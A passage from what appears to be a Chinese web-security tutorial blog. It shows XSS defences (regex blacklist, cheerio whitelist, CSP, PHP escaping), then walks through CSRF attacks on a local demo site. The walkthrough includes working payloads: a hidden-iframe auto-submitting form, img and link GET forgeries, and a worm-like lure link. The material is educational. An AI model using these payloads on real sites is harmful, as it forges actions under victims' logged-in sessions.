class=&quot;params&quot;&gt;html&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!html) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    html = html.replace(&lt;span class=&quot;regexp&quot;&gt;/&amp;lt;\s*\/?script\s*&amp;gt;/g&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    html = html.replace(&lt;span class=&quot;regexp&quot;&gt;/javascript:[^&amp;#x27;&amp;quot;]*/g&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    html = html.replace(&lt;span class=&quot;regexp&quot;&gt;/onerror\s*=\s*[&amp;#x27;&amp;quot;]?[^&amp;#x27;&amp;quot;]*[&amp;#x27;&amp;quot;&amp;#x27;]?/g&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; html;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;此时点击刚刚那两个就不会有任何的反应的了，我们可以点击源码看一下![image-20200430173828013](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430173828013.png)</code></pre></li></ul></li></ul><pre><code>- `白名单防御`:我们面临一个解析HTML的问题，此时我们安装一个库就行了即`cheerio`，使用如下的命令安装：`npm install cheerio --registry=http://registry.npm.taobao.org -S`以下的截图是`        console.log(&#39;this is elem:&#39;, elem); //针对评论的elem 的输出`的执行结果，主要看`name和attribs`两个字段![image-20200430175539367](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430175539367.png)&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 白名单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xssFilter = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;html&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!html) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; cheerio = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;cheerio&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; $ = cheerio.load(html);   &lt;span class=&quot;comment&quot;&gt;//使用的是类似jQuery的语法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 白名单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; whiteList = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&amp;#x27;src&amp;#x27;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;#x27;font&amp;#x27;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&amp;#x27;color&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&amp;#x27;href&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $(&lt;span class=&quot;string&quot;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;).each(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;index, elem&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// console.log(&amp;#x27;this is elem:&amp;#x27;, elem); //针对评论的elem 的输出,其输出的内容会截图出来的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!whiteList[elem.name])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $(elem).remove();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; attr &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; elem.attribs) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(whiteList[elem.name].indexOf(attr) === &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $(elem).attr(attr, &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(html, $.html());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; $.html();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;![image-20200430203231659](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430203231659.png)</code></pre><h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><ul><li>Content Security Policy</li><li>内容安全策略</li><li>用于指定哪些内容可执行</li></ul><p>他有这些内容，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">child-src connect-src <span class="keyword">default</span>-src</span><br><span class="line">font-src frame-src img-src </span><br><span class="line">manifest-src media-src object-src </span><br><span class="line">script-src style-src worker-src</span><br><span class="line"></span><br><span class="line">&lt;host-source&gt; <span class="xml"><span class="tag">&lt;<span class="name">scheme-source</span>&gt;</span> &#x27;self&#x27;</span></span><br><span class="line"><span class="xml">&#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; &#x27;none&#x27; </span></span><br><span class="line">&#x27;nonce-cbase64-value&gt;&#x27; &lt;chash-source&gt; </span><br><span class="line">&#x27;strict-dynamic&#x27;</span><br></pre></td></tr></table></figure><p>在输入栏输入<code>http://localhost:8090/?from=alert(&#39;google&#39;)google</code>，会正常的攻击（把之前写的防御代码注释掉）</p><p>此时的运行如下，有些内容不显示</p><p>在<code>site.js--routes</code>文件中添加代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">router.all(<span class="string">&#x27;/*&#x27;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">ctx, next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;enter site.js&#x27;</span>);</span><br><span class="line">    ctx.set(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">0</span>);  <span class="comment">//0表示xss防御关闭，1表示默认即开启xss防御</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//--增加内容---------------</span></span><br><span class="line">    ctx.set(<span class="string">`Content-Security-Policy`</span>, <span class="string">`default-src &#x27;self&#x27;`</span>);</span><br><span class="line">    <span class="comment">//------------------</span></span><br><span class="line">    <span class="keyword">await</span> next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430210442123.png" alt="image-20200430210442123"></p><h3 id="PHP-XSS"><a href="#PHP-XSS" class="headerlink" title="PHP-XSS"></a>PHP-XSS</h3><p>防御方法</p><ul><li>内置函数转义</li><li>DOM解析白名单</li><li>解析库</li><li>CSP</li></ul><p>测试的开始的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(strtolower($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="string">&#x27;post&#x27;</span>)&#123;</span><br><span class="line">    $content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $content; <span class="meta">?&gt;</span>&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;content&quot;</span>&gt;hello&lt;/textarea&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>增加几行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;X-Xss-Protection: 0&#x27;</span>);   <span class="comment">// 关闭浏览器的默认XSS拦截防御</span></span><br><span class="line"><span class="keyword">if</span>(strtolower($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]) == <span class="string">&#x27;post&#x27;</span>)&#123;</span><br><span class="line">    $content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="comment">// $content = strip_tags($content);  //最终的content是去掉标签的</span></span><br><span class="line">    <span class="comment">//原样输出，可对指定的字符进行转义的</span></span><br><span class="line">    $content = htmlspecialchars($content);</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 剩下的都不变</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430213409049.png" alt="image-20200430213409049"></p><h1 id="2-前端CSRF"><a href="#2-前端CSRF" class="headerlink" title="2 前端CSRF"></a>2 前端CSRF</h1><h2 id="1-CSRF攻击简介和演示"><a href="#1-CSRF攻击简介和演示" class="headerlink" title="1 CSRF攻击简介和演示"></a>1 CSRF攻击简介和演示</h2><p><code>CSRF</code>：Cross site request forgy 即 跨站请求伪造</p><p>在XSS攻击中： 本网站运行了其他网站的脚本，即非本网站的脚本</p><p>在CSRF攻击中: 其他的网站对本网站产生了影响，即其他网站对本网站发出了一些请求，这些请求是在用户不知情的情况下完成的</p><p>我们选择一条没有评论的新闻作为演示：<code>http://localhost:8090/post/13</code></p><p>目前我是以匿名用户进行登录的，我们可以在cookie中进行查看。</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501100307532.png" alt="image-20200501100307532"></p><p>现在我们去登录一下页面<code>http://localhost:8090/user/login</code>,用户名TooBug，密码123456，此时多了一条cookie信息，且评论带有用户名信息的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501112617664.png" alt="image-20200501112617664"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501112705493.png" alt="image-20200501112705493"></p><p>此时我们来看一下CSRF攻击的一个页面，该页面可以部署到任何的网站，属于第三方网页，可以不放在自己的网站中的，其代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;文件在other中的csrf.html中</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&#x2F;&gt;</span><br><span class="line">        &lt;title&gt;csrf demo&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        hello，这里什么也没有。     &#x2F;&#x2F;这是唯一可视化 的内容</span><br><span class="line">        &lt;script&gt;                 &#x2F;&#x2F;脚本发表评论到网站中</span><br><span class="line">            document.write(&#96;    &#x2F;&#x2F;创建一个表单，</span><br><span class="line">                &lt;form name&#x3D;&quot;commentForm&quot; target&#x3D;&quot;csrf&quot; method&#x3D;&quot;post&quot;     action&#x3D;&quot;http:&#x2F;&#x2F;localhost:1521&#x2F;post&#x2F;addComment&quot;&gt;                    &#x2F;&#x2F;该&#x2F;post&#x2F;addComment就是添加评论的接口</span><br><span class="line">                    &lt;input name&#x3D;&quot;postId&quot; type&#x3D;&quot;hidden&quot; value&#x3D;&quot;13&quot;&gt;  &#x2F;&#x2F;参数postId&#x3D;13即我们刚刚发表评论的那个页面  </span><br><span class="line">                    &lt;textarea name&#x3D;&quot;content&quot;&gt;来自CSRF！&lt;&#x2F;textarea&gt;   &#x2F;&#x2F;content的内容就是发表的内容</span><br><span class="line">                &lt;&#x2F;form&gt;&#96;</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            var iframe &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line">            iframe.name &#x3D; &#39;csrf&#39;;</span><br><span class="line">            iframe.style.display &#x3D; &#39;none&#39;;     &#x2F;&#x2F;创建一个iframe后将其隐藏</span><br><span class="line">            document.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">            setTimeout(function()&#123;</span><br><span class="line">                document.querySelector(&#39;[name&#x3D;commentForm]&#39;).submit();    </span><br><span class="line">                &#x2F;&#x2F;name&#x3D;commentForm即找到form中name为从commentForm的表单，我们知道提交表单的时候，会发生页面跳转（即重新导航）但是我们这里并没有发生跳转。其原因是 ：表单form支持target的，如果该target指向iframe.name,我们这里target&#x3D;&quot;csrf&quot;、iframe.name &#x3D; &#39;csrf&#39;,即都是csrf，则当两个相等的时候这个表单会在iframe中进行提交、跳转的。而我们的iframe设置的是隐藏，所以我们看不见了</span><br><span class="line">           </span><br><span class="line">            &#125;,1000);</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开csrf.html页面的展示如下，注意此时在你打开的postId=13的网页中添加了一条信息，内容为<code>来自CSRF</code>，并且用的是你刚刚在网站中登录的信息作为发表的，即该信息由用户TooBug发表的，这些工作都是脚本替你完成这个评论的</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501113046179.png" alt="image-20200501113046179"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501113404742.png" alt="image-20200501113404742"></p><p>我们可以看出来，用户任意打开一个网站后，那么会有一些操作在另一个网站上中在执行。例如上面的例子中你打开csrf.html的网站，你却在另一个网站中进行了评论操作。我们这里发表评论用的是<code>post</code>请求的，而post是需要构造一个表单的。如果我们用的是<code>get</code>方式，那么就会更加容易的多。我们在<code>router</code>下的<code>sites.js中添加一个路径</code>即<code>router.get(&#39;/ajax/addComment&#39;, site.addComment);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Router = <span class="keyword">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> Router(&#123;</span><br><span class="line">    prefix: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> site = <span class="keyword">require</span>(<span class="string">&#x27;../controllers/site&#x27;</span>);</span><br><span class="line"></span><br><span class="line">router.all(<span class="string">&#x27;/*&#x27;</span>, async <span class="function"><span class="keyword">function</span>(<span class="params">ctx, next</span>)</span>&#123;</span><br><span class="line">    console.log(<span class="string">&#x27;enter site.js&#x27;</span>);</span><br><span class="line">    ctx.set(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">0</span>);  <span class="comment">//0表示xss防御关闭，1表示默认即开启xss防御</span></span><br><span class="line">    <span class="comment">// ctx.set(`Content-Security-Policy`, `default-src &#x27;self&#x27;`);</span></span><br><span class="line">    await next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, site.index);</span><br><span class="line">router.get(<span class="string">&#x27;/post/:id&#x27;</span>, site.post);</span><br><span class="line">router.post(<span class="string">&#x27;/post/addComment&#x27;</span>, site.addComment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加的路径</span></span><br><span class="line">router.get(<span class="string">&#x27;/ajax/addComment&#x27;</span>, site.addComment);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>controllers</code>下的<code>site.js</code>文件中，有关于<code>addComment</code>的一个逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exports.addComment = async <span class="function"><span class="keyword">function</span> (<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> data;</span><br><span class="line">        <span class="keyword">if</span>(ctx.request.method.toLowerCase() ===<span class="string">&#x27;post&#x27;</span>)&#123;    <span class="comment">//post请求</span></span><br><span class="line">            data = ctx.request.body;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            data = ctx.request.query;                    <span class="comment">//从get请求中获得，即query</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>我们在url中输入<code>localhost:1521/ajax/addComment?postid=13&amp;content=我是来自get的评论</code>同样会产生评论，如下</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501120140671.png" alt="image-20200501120140671"></p><p>我们将script中脚本注释掉，在<code>        hello，这里什么也没有。</code>后面添加代码（<code>localhost:1521/ajax/addComment?postid=13&amp;content=我是来自get的评论</code>是下面href中的内容），如下所示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello，这里什么也没有。</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;localhost%3A1521%2Fajax%2FaddComment%3Fpostid%3D13%26content%3D%E6%88%91%E6%98%AF%E6%9D%A5%E8%87%AAget%E7%9A%84%E8%AF%84%E8%AE%BA&quot;</span>&gt;</span>点击这里有钱拿<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>重新加载<code>csrf.html</code>，显示如下，然后点击<code>蓝色字体</code>,就会跳转到之前postid=13的页面中，并且评论了内容</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501120538805.png" alt="image-20200501120538805"></p><p>CSRF攻击有一个别称，叫做<code>one click attck</code>即一点就爆炸。刚刚那个是点击蓝色字体才能功能生效，能够不用点击就可以实现呢？毕竟点击的转化率比较低。我们可以使用图片标签，将之前的内容替换成这个</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello，这里什么也没有。</span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;localhost%3A1521%2Fajax%2FaddComment%3Fpostid%3D13%26content%3D%E6%88%91%E6%98%AF%E6%9D%A5%E8%87%AAget%E7%9A%84%E8%AF%84%E8%AE%BA&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>显示效果如下，图片加载失败，同时增加了一条评论</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501130844036.png" alt="image-20200501130844036"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501130929093.png" alt="image-20200501130929093"></p><p>我们还可以将其变种，如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello，这里什么也没有。</span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;localhost:1521/ajax/addComment?postid=13&amp;content=&lt;a href=file:///E:/%E4%B8%8B%E8%BD%BD/%E8%85%BE%E8%AE%AF%E5%A4%A7%E7%89%9B%E4%BA%B2%E6%8E%88%20Web%20%E5%89%8D%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/project/t1eexx/other/csrf.html&gt;点击这里有钱拿&lt;/a&gt;&quot;</span>/&gt;</span>   //content内容为一个超链接</span><br></pre></td></tr></table></figure><p>此时点击<code>csrf.html</code>后，会在页面中添加一个带有超链接的评论的，如下所示，点击这个链接会跳到csrf.html页面中去（这种链接如果发给很多人，都点击后相当于一个蠕虫了，危害很大的，影响面很大）</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501131450349.png" alt="image-20200501131450349"></p><h2 id="2-CSRF攻击原理和危害"><a href="#2-CSRF攻击原理和危害" class="headerlink" title="2 CSRF攻击原理和危害"></a>2 